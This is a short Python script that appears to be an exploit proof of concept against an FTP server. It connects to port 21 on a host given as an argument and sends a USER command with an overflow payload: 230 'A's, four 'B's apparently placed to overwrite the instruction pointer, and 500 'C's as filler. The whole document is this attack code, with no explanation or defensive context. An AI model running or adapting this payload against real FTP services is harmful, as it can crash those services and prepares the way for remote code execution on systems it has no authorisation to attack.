import socket, sys

target = sys.argv[1]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, 21))
data = s.recv(1024)
print(data)

buf = ""
buf += "A" * 230 + "B" * 4 + "C" * 500

s.send("USER " + buf + "\r\n")
s.close()
